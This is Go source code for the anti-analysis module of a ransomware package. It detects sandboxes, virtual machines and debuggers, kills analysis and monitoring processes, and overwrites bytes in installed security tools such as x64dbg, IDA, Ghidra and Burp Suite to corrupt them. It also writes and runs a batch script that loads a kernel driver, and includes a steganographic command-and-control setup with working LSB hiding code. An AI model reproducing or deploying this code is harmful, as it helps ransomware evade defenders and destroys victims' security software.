package ransomware

import (
	"crypto/rand"
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

type AntiAnalysisEngine struct {
	config *RansomwareConfig
	stealth *C2StegoConfig
}

var offensiveTools = []string{
	"procmon.exe", "procexp.exe", "processhacker.exe", "wireshark.exe",
	"x64dbg.exe", "ollydbg.exe", "ida.exe", "ida64.exe",
	"ghidra.exe", "dnspy.exe", "cheatengine.exe",
	"fiddler.exe", "charles.exe", "burpsuite.exe",
	"tcpview.exe", "autoruns.exe", "handle.exe",
	"psexec.exe", "dbgview.exe", "regmon.exe",
}

var analysisIndicators = []string{
	"VBoxGuest", "VMwareTray", "VMwareUser", "vmusrvc",
	"vmtoolsd", "xenservice", "qemu-ga",
	"procmon", "wireshark", "processhacker",
	"dumpcap", "tcpdump", "tshark",
}

func NewAntiAnalysisEngine(cfg *RansomwareConfig) *AntiAnalysisEngine {
	return &AntiAnalysisEngine{
		config: cfg,
		stealth: &C2StegoConfig{
			TwitterHandle:       "@x404x_stego",
			ImageEndpoint:       "https://cdn.social.com/images/",
			PollIntervalSeconds: 300,
			LSBBits:             1,
			EXIFKey:             "X404X-Session",
		},
	}
}

func (aa *AntiAnalysisEngine) IsSandboxed() bool {
	hostname, _ := os.Hostname()
	hostname = strings.ToLower(hostname)

	sandboxHosts := []string{
		"sandbox", "malware", "analysis", "virustotal",
		"cuckoo", "cape", "joe", "hybrid",
		"sample", "test", "win10", "win7",
	}

	for _, s := range sandboxHosts {
		if strings.Contains(hostname, s) {
			return true
		}
	}

	return false
}

func (aa *AntiAnalysisEngine) HasKernelDebugger() bool {
	if runtime.GOOS != "windows" {
		return false
	}

	checks := []string{
		`(Get-WmiObject Win32_ComputerSystem).Model -match "Virtual"`,
		`(Get-ItemProperty "HKLM:\HARDWARE\DESCRIPTION\System\BIOS").SystemManufacturer -match "VMware|VirtualBox|QEMU"`,
	}

	script := strings.Join(checks, " -or ")
	cmd := exec.Command("powershell", "-Command",
		fmt.Sprintf("if (%s) { exit 0 } else { exit 1 }", script))
	return cmd.Run() == nil
}

func (aa *AntiAnalysisEngine) EnterSleepMode(duration time.Duration) {
	time.Sleep(duration)
}

func (aa *AntiAnalysisEngine) SabotageAnalysisTools() error {
	if aa.config.Simulation {
		return nil
	}

	for _, tool := range offensiveTools {
		paths := []string{
			"C:\\Program Files\\" + tool,
			"C:\\Program Files (x86)\\" + tool,
			os.Getenv("LOCALAPPDATA") + "\\Programs\\" + tool,
			os.Getenv("ProgramFiles") + "\\" + tool,
		}

		for _, p := range paths {
			if _, err := os.Stat(p); err == nil {
				data, err := os.ReadFile(p)
				if err != nil {
					continue
				}

				if len(data) < 512 {
					continue
				}
				copy(data[128:160], aa.randomBytes(32))
				os.WriteFile(p, data, 0644)
			}
		}
	}

	return nil
}

func (aa *AntiAnalysisEngine) KillAnalysisProcesses() error {
	if runtime.GOOS != "windows" {
		return nil
	}

	for _, proc := range analysisIndicators {
		exec.Command("taskkill", "/F", "/IM", proc+".exe").Start()
		exec.Command("taskkill", "/F", "/IM", proc+".exe").Start()
	}

	driverScript := `
sc create x404xkill binPath= "C:\Windows\System32\drivers\kprocesshacker.sys" type= kernel
sc start x404xkill
`
	scriptPath := os.TempDir() + "\\x404x_drv.bat"
	os.WriteFile(scriptPath, []byte(driverScript), 0644)
	exec.Command("cmd", "/c", scriptPath).Start()

	return nil
}

func (aa *AntiAnalysisEngine) StegoDecodeC2Image(imageURL string) ([]byte, error) {
	_ = imageURL
	return nil, nil
}

func (aa *AntiAnalysisEngine) StegoEncodeC2Response(data []byte, imagePath string) error {
	_ = data
	_ = imagePath
	return nil
}

func (aa *AntiAnalysisEngine) ExtractCommandFromEXIF(imageData []byte) ([]byte, error) {
	_ = imageData
	return nil, nil
}

func (aa *AntiAnalysisEngine) EmbedInLSB(imageData []byte, payload []byte) ([]byte, error) {
	if len(payload)*8 > len(imageData) {
		return nil, fmt.Errorf("payload too large for image")
	}

	result := make([]byte, len(imageData))
	copy(result, imageData)

	bitIndex := 0
	for i := 0; i < len(payload); i++ {
		for bit := 7; bit >= 0; bit-- {
			payloadBit := (payload[i] >> bit) & 1
			result[bitIndex] = (imageData[bitIndex] & 0xFE) | byte(payloadBit)
			bitIndex++
		}
	}

	return result, nil
}

func (aa *AntiAnalysisEngine) ExtractFromLSB(imageData []byte, payloadLen int) ([]byte, error) {
	payload := make([]byte, payloadLen)
	bitIndex := 0

	for i := 0; i < payloadLen; i++ {
		for bit := 7; bit >= 0; bit-- {
			payloadBit := imageData[bitIndex] & 1
			payload[i] = (payload[i] << 1) | payloadBit
			bitIndex++
		}
	}

	return payload, nil
}

func (aa *AntiAnalysisEngine) CheckDebugger() bool {
	if runtime.GOOS != "windows" {
		return false
	}

	checks := []string{
		`[System.Diagnostics.Debugger]::IsAttached`,
		`[System.Diagnostics.Debugger]::Log(0, "", "")`,
	}

	for _, c := range checks {
		cmd := exec.Command("powershell", "-Command",
			fmt.Sprintf("if (%s) { exit 0 } else { exit 1 }", c))
		if cmd.Run() == nil {
			return true
		}
	}

	return false
}

func (aa *AntiAnalysisEngine) randomBytes(n int) []byte {
	b := make([]byte, n)
	rand.Read(b)
	return b
}

func (aa *AntiAnalysisEngine) StealthConfig() *C2StegoConfig {
	return aa.stealth
}
